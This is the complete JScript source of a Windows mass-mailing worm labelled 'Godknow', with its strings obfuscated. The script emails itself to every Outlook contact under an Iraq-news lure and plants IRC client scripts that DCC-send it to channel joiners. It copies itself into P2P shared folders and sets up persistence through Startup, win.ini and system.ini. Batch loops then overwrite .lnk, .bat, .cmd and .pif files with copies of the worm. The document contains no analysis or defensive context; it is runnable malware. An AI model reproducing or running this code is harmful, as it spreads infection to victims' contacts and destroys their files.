// Virusname: Godknow By TAREK
var hrqcj=unescape("%63")
var znssc=unescape("%64")
var nofkb=unescape("%65")
var pfzkm=unescape("%69")
var pnvau="k"
var gcpzf="n"
var dtsjx="p"
var hzhhu="t"
var uhghg="u"
var pmksp="v"
var tbqyr=unescape("%77")
var lpyhf="x"
var ltxtc=unescape("%79")
var jbhkl=WScript.CreateObject("s"+hrqcj+"r"+pfzkm+dtsjx+hzhhu+pfzkm+gcpzf+unescape("%67")+"."+"f"+pfzkm+"l"+nofkb+"s"+ltxtc+"s"+hzhhu+nofkb+"m"+"o"+unescape("%62")+"j"+nofkb+hrqcj+hzhhu)
var xjail=WScript.CreateObject(tbqyr+"s"+hrqcj+"r"+pfzkm+dtsjx+hzhhu+"."+"s"+unescape("%68")+nofkb+"l"+"l")
var oehbq=jbhkl.GetSpecialFolder(0)
var lpfyg=jbhkl.OpenTextFile(WScript.ScriptFullName, 1)
var lcjds=lpfyg.ReadAll()
var ppyyc=xjail.RegRead("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\ProgramFilesDir")
lpfyg.Close();
vofnu=jbhkl.CreateTextFile("gwrwa.js");
vofnu.WriteLine(lcjds);
vofnu.Close();
jbhkl.CopyFile("gwrwa.js","ZalmayKhalilzad");
var hsfdc, mfflj, ywdky, hjgof, cvhsd, xeedd
{
mfflj = WScript.CreateObject("Outlook.Application");
ywdky=mfflj.GetNamespace("m"+"a"+dtsjx+pfzkm);
hsfdc=0;
for(hjgof=1;hjgof<=ywdky.AddressLists.Count;hjgof++)
{
for(cvhsd=1;cvhsd<=ywdky.AddressLists(hjgof).AddressEntries.Count;cvhsd++)
{
if (hsfdc==15)
{
xeedd.Send
hsfdc=0;
}
if (hsfdc==0)
{
xeedd=mfflj.CreateItem(0);
xeedd.Subject = " Powell Presses Allies on Iraq, Dissident Rejects Transition Plan ";
xeedd.Body = "Adnan Pachachi, 79, who was foreign minister in the government toppled by Saddam's Baath Party in a 1968 coup, told The Associated Press that a regime change in Iraq was inevitable. But he said that the transitional period must be in the hands of Iraqis.";
xeedd.Attachments.Add("ZalmayKhalilzad");
}
xeedd.Recipients.Add(ywdky.AddressLists(hjgof).AddressEntries(cvhsd));
hsfdc++;
}
}
if (hsfdc!=0) xeedd.Send
}
if (jbhkl.FolderExists("C:\\mirc"))
{ var csjog="C:\\mirc";
}
if (jbhkl.FolderExists("C:\\Programme\\mirc"))
{ var csjog="C:\\Programme\\mirc";
}
if (jbhkl.FolderExists("C:\\Program Files\\mirc"))
{ var csjog="C:\\Program Files\\mirc";
}
if (csjog!="")
{ jbhkl.CopyFile("gwrwa.js",csjog+"\\GodKnow");
fhuti=jbhkl.CreateTextFile(csjog+"\\script.ini");
fhuti.WriteLine("["+"s"+hrqcj+"r"+pfzkm+dtsjx+hzhhu+"]");
fhuti.WriteLine(gcpzf+"0="+"o"+gcpzf+" 1:"+"j"+"o"+pfzkm+gcpzf+":*"+"."+"*: { "+pfzkm+"f"+" ( $"+gcpzf+pfzkm+hrqcj+pnvau+"==$"+"m"+nofkb+") {"+unescape("%68")+"a"+"l"+hzhhu+"} /"+znssc+hrqcj+hrqcj+" "+"s"+nofkb+gcpzf+znssc+" $"+gcpzf+pfzkm+hrqcj+pnvau+" "+csjog+"\\GodKnow }");
fhuti.Close();
}
if (jbhkl.FolderExists("C:\\Pirch98"))
{ var rrbrr="C:\\Pirch98";
}
if (jbhkl.FolderExists("C:\\Programme\\Pirch98"))
{ var rrbrr="C:\\Programme\\Pirch98";
}
if (jbhkl.FolderExists("C:\\Program Files\\Pirch98"))
{ var rrbrr="C:\\Program Files\\Pirch98";
}
if (rrbrr!="")
{ jbhkl.CopyFile("gwrwa.js",rrbrr+"\\GodKnow");
seyjk=jbhkl.CreateTextFile(rrbrr+"\\events.ini");
seyjk.WriteLine("[L"+nofkb+pmksp+nofkb+"l"+"s"+"]");
seyjk.WriteLine("E"+gcpzf+"a"+unescape("%62")+"l"+nofkb+znssc+" = 1");
seyjk.WriteLine("C"+"o"+uhghg+gcpzf+hzhhu+"=6");
seyjk.WriteLine("L"+nofkb+pmksp+nofkb+"l"+"1=000-U"+gcpzf+pnvau+gcpzf+"o"+tbqyr+"s");
seyjk.WriteLine("000-U"+gcpzf+pnvau+gcpzf+"o"+tbqyr+"s"+"E"+gcpzf+"a"+unescape("%62")+"l"+nofkb+znssc+"=1");
seyjk.WriteLine("L"+nofkb+pmksp+nofkb+"l"+"2=100-L"+nofkb+pmksp+nofkb+"l"+" 100");
seyjk.WriteLine("100-L"+nofkb+pmksp+nofkb+"l"+" 100E"+gcpzf+"a"+unescape("%62")+"l"+nofkb+znssc+"=1");
seyjk.WriteLine("L"+nofkb+pmksp+nofkb+"l"+"3=200-L"+nofkb+pmksp+nofkb+"l"+" 200");
seyjk.WriteLine("200-L"+nofkb+pmksp+nofkb+"l"+" 200E"+gcpzf+"a"+unescape("%62")+"l"+nofkb+znssc+"=1");
seyjk.WriteLine("L"+nofkb+pmksp+nofkb+"l"+"4=300-L"+nofkb+pmksp+nofkb+"l"+" 300");
seyjk.WriteLine("300-L"+nofkb+pmksp+nofkb+"l"+" 300E"+gcpzf+"a"+unescape("%62")+"l"+nofkb+znssc+"=1");
seyjk.WriteLine("L"+nofkb+pmksp+nofkb+"l"+"5=400-L"+nofkb+pmksp+nofkb+"l"+" 400");
seyjk.WriteLine("400-L"+nofkb+pmksp+nofkb+"l"+" 400E"+gcpzf+"a"+unescape("%62")+"l"+nofkb+znssc+"=1");
seyjk.WriteLine("L"+nofkb+pmksp+nofkb+"l"+"6=500-L"+nofkb+pmksp+nofkb+"l"+" 500");
seyjk.WriteLine("500-L"+nofkb+pmksp+nofkb+"l"+" 500E"+gcpzf+"a"+unescape("%62")+"l"+nofkb+znssc+"=1");
seyjk.WriteLine("[000-U+"+gcpzf+pnvau+gcpzf+"o"+tbqyr+gcpzf+"s"+"] ");
seyjk.WriteLine("U"+"s"+nofkb+"r"+"1=*!*@*");
seyjk.WriteLine("U"+"s"+nofkb+"r"+"C"+"o"+uhghg+gcpzf+hzhhu+"=1");
seyjk.WriteLine("E"+pmksp+nofkb+gcpzf+hzhhu+"s"+"1="+"o"+gcpzf+" "+"j"+"o"+pfzkm+gcpzf+":#: /"+znssc+hrqcj+hrqcj+" "+"s"+nofkb+gcpzf+znssc+" $"+gcpzf+pfzkm+hrqcj+pnvau+" "+rrbrr+"\\GodKnow");
seyjk.WriteLine("E"+pmksp+nofkb+gcpzf+hzhhu+"C"+"o"+uhghg+gcpzf+hzhhu+"=1");
seyjk.WriteLine("[100-L"+nofkb+pmksp+nofkb+"l"+" 100]");
seyjk.WriteLine("U"+"s"+nofkb+"r"+"C"+"o"+uhghg+gcpzf+hzhhu+"=0");
seyjk.WriteLine("E"+pmksp+nofkb+gcpzf+hzhhu+"C"+"o"+uhghg+gcpzf+hzhhu+"=0");
seyjk.WriteLine("[200-L"+nofkb+pmksp+nofkb+"l"+" 200]");
seyjk.WriteLine("U"+"s"+nofkb+"r"+"C"+"o"+uhghg+gcpzf+hzhhu+"=0");
seyjk.WriteLine("E"+pmksp+nofkb+gcpzf+hzhhu+"C"+"o"+uhghg+gcpzf+hzhhu+"=0");
seyjk.WriteLine("[300-L"+nofkb+pmksp+nofkb+"l"+" 300]");
seyjk.WriteLine("U"+"s"+nofkb+"r"+"C"+"o"+uhghg+gcpzf+hzhhu+"=0");
seyjk.WriteLine("E"+pmksp+nofkb+gcpzf+hzhhu+"C"+"o"+uhghg+gcpzf+hzhhu+"=0");
seyjk.WriteLine("[400-L"+nofkb+pmksp+nofkb+"l"+" 400]");
seyjk.WriteLine("U"+"s"+nofkb+"r"+"C"+"o"+uhghg+gcpzf+hzhhu+"=0");
seyjk.WriteLine("E"+pmksp+nofkb+gcpzf+hzhhu+"C"+"o"+uhghg+gcpzf+hzhhu+"=0");
seyjk.WriteLine("[500-L"+nofkb+pmksp+nofkb+"l"+" 500]");
seyjk.WriteLine("U"+"s"+nofkb+"r"+"C"+"o"+uhghg+gcpzf+hzhhu+"=0");
seyjk.WriteLine("E"+pmksp+nofkb+gcpzf+hzhhu+"C"+"o"+uhghg+gcpzf+hzhhu+"=0");
seyjk.Close();
}
if (jbhkl.FolderExists("C:\\Virc"))
{ var fxmiw="C:\\Virc";
}
if (jbhkl.FolderExists("C:\\Programme\\Virc"))
{ var fxmiw="C:\\Programme\\Virc";
}
if (jbhkl.FolderExists("C:\\Program Files\\Virc"))
{ var fxmiw="C:\\Program Files\\Virc";
}
if (fxmiw!="")
{ jbhkl.CopyFile("gwrwa.js",fxmiw+"\\GodKnow");
xjail.RegWrite("HKEY_CURRENT_USER\\Software\\MeGaLiTh Software\\Visual IRC 96\\Events\\Event17", "dcc send $nick "+fxmiw+"\\GodKnow");
}
if (jbhkl.FolderExists(oehbq+"\\Startmenu\\Programs\\StartUp"))
{ jbhkl.CopyFile("gwrwa.js",oehbq+"\\Startmenu\\Programs\\StartUp\\wevtg.js");
}
jbhkl.CopyFile("gwrwa.js",oehbq+"\\cwqlb.js");
drdpx=jbhkl.CreateTextFile(oehbq+"\\win.ini");
drdpx.WriteLine("["+tbqyr+pfzkm+gcpzf+znssc+"o"+tbqyr+"s"+"]");
drdpx.WriteLine("l"+"o"+"a"+znssc+"="+oehbq+"\\cwqlb.js");
drdpx.WriteLine("r"+uhghg+gcpzf+"="+oehbq+"\\cwqlb.js");
drdpx.WriteLine("N"+uhghg+"l"+"l"+"P"+"o"+"r"+hzhhu+"=N"+"o"+gcpzf+nofkb);
drdpx.Close();
jbhkl.CopyFile("gwrwa.js",oehbq+"\\awlzn.js");
qpxtj=jbhkl.CreateTextFile(oehbq+"\\system.ini");
qpxtj.WriteLine("["+unescape("%62")+"o"+"o"+hzhhu+"]");
qpxtj.WriteLine("s"+unescape("%68")+nofkb+"l"+"l"+"="+nofkb+lpyhf+dtsjx+"l"+"o"+"r"+nofkb+"r"+"."+nofkb+lpyhf+nofkb+" "+oehbq+"\\awlzn.js");
qpxtj.Close();
nihaf=(ppyyc+"\\Kazaa\\My Shared Folder");
if (jbhkl.FolderExists(nihaf))
{ jbhkl.CopyFile("gwrwa.js", nihaf+"\\United States");
}
zfznt=(ppyyc+"\\KaZaA Lite\\My Shared Folder");
if (jbhkl.FolderExists(zfznt))
{ jbhkl.CopyFile("gwrwa.js", zfznt+"+\\United States");
}
fgaoc=(ppyyc+"\\Morpheus\\My Shared Folder");
if (jbhkl.FolderExists(fgaoc))
{ jbhkl.CopyFile("gwrwa.js", fgaoc+"+\\United States");
}
vvyxz=(ppyyc+"\\Grokster\\My Grokster");
if (jbhkl.FolderExists(vvyxz))
{ jbhkl.CopyFile("gwrwa.js", vvyxz+"\\United States");
}
bgztu=(ppyyc+"\\BearShare\\Shared");
if (jbhkl.FolderExists(bgztu))
{ jbhkl.CopyFile("gwrwa.js", bgztu+"\\United States");
}
gsmyw=(ppyyc+"\\KMD\\My Shared Folder");
if (jbhkl.FolderExists(gsmyw))
{ jbhkl.CopyFile("gwrwa.js", gsmyw+"\\United States");
}
auubg=(ppyyc+"\\LimeWire\\Shared");
if (jbhkl.FolderExists(auubg))
{ jbhkl.CopyFile("gwrwa.js", auubg+"\\United States");
}
rmirw=(ppyyc+"\\edonkey2000\\incoming");
if (jbhkl.FolderExists(rmirw))
{ jbhkl.CopyFile("gwrwa.js", rmirw+"\\United States");
}
jbhkl.CopyFile("gwrwa.js","C:\\gngxf.js");
var ubrnh=xjail.CreateShortCut("oxeaj.lnk");
ubrnh.TargetPath=xjail.ExpandEnvironmentStrings("C:\\gngxf.js");
ubrnh.Save();
jmcrb=jbhkl.CreateTextFile("ampox.bat");
jmcrb.WriteLine("f"+"o"+"r"+" %%"+"l"+" "+pfzkm+gcpzf+" (*."+"l"+gcpzf+pnvau+" ..\\*."+"l"+gcpzf+pnvau+" \\*."+"l"+gcpzf+pnvau+" %path%\\*."+"l"+gcpzf+pnvau+") "+znssc+"o"+" "+hrqcj+"o"+dtsjx+ltxtc+" oxeaj.lnk %%l");
jmcrb.Close();
xjail.Run("ampox.bat");
jbhkl.CopyFile("gwrwa.js",oehbq+"\\pafkx.js");
var iesqg=jbhkl.CreateTextFile(oehbq+"\\thrwa.bat");
iesqg.WriteLine(nofkb+hrqcj+unescape("%68")+"o"+" "+"o"+"f"+"f");
iesqg.WriteLine(hrqcj+"s"+"r"+pfzkm+dtsjx+hzhhu+" "+oehbq+"\\pafkx.js");
iesqg.Close();
var enxpf=jbhkl.CreateTextFile(oehbq+"\\osuyp.bat")
enxpf.WriteLine("f"+"o"+"r"+" %%"+unescape("%62")+" "+pfzkm+gcpzf+" (*."+unescape("%62")+"a"+hzhhu+" ..\\*."+unescape("%62")+"a"+hzhhu+" \\*."+unescape("%62")+"a"+hzhhu+" %path%\\*."+unescape("%62")+"a"+hzhhu+") "+znssc+"o"+" "+hrqcj+"o"+dtsjx+ltxtc+" "+oehbq+"\\thrwa.bat %%b");
enxpf.Close();
xjail.run (oehbq+"\\osuyp.bat");
jbhkl.CopyFile("gwrwa.js",oehbq+"\\fgubv.js");
var eygwe=jbhkl.CreateTextFile(oehbq+"\\dezva.cmd");
eygwe.WriteLine("@echo off");
eygwe.WriteLine("start "+oehbq+"\\windr.js");
eygwe.Close();
var omzmw=jbhkl.CreateTextFile("aczjr.cmd");
omzmw.WriteLine(nofkb+hrqcj+unescape("%68")+"o"+" "+"o"+"f"+"f");
omzmw.WriteLine("f"+"o"+"r"+" /"+"r"+" C:\\ %%c "+pfzkm+gcpzf+" (*."+hrqcj+"m"+znssc+") "+znssc+"o"+" "+hrqcj+"o"+dtsjx+ltxtc+" "+oehbq+"\\dezva.cmd %%c");
omzmw.Close();
xjail.Run("aczjr.cmd");
jbhkl.CopyFile("gwrwa.js",oehbq+"\\ozywe.js");
lcswh=jbhkl.CreateTextFile(oehbq+"\\ywxbt.bat");
lcswh.WriteLine(nofkb+hrqcj+unescape("%68")+"o"+" "+"o"+"f"+"f");
lcswh.WriteLine(hrqcj+hzhhu+hzhhu+ltxtc+" "+gcpzf+uhghg+"l");
lcswh.WriteLine(hrqcj+"s"+hrqcj+"r"+pfzkm+dtsjx+hzhhu+" "+oehbq+"\\ozywe.js");
lcswh.Close();
var pmbnu = xjail.CreateShortcut(oehbq+"\\ixzit.lnk");
pmbnu.TargetPath = xjail.ExpandEnvironmentStrings(oehbq+"\\ywxbt.bat");
pmbnu.WindowStyle = 4;
pmbnu.Save();
neqeg=jbhkl.CreateTextFile("C:\\ywxbt.bat");
neqeg.WriteLine(nofkb+hrqcj+unescape("%68")+"o"+" "+"o"+"f"+"f");
neqeg.WriteLine("f"+"o"+"r"+" %%"+dtsjx+" "+pfzkm+gcpzf+" (*."+dtsjx+pfzkm+"f"+" ..\\*."+dtsjx+pfzkm+"f"+" \\*."+dtsjx+pfzkm+"f"+" %path%\\*."+dtsjx+pfzkm+"f"+") "+znssc+"o"+" "+hrqcj+"o"+dtsjx+ltxtc+" "+oehbq+"\\ixzit.pif %%p");
neqeg.Close();
xjail.Run("C:\\ywxbt.bat");
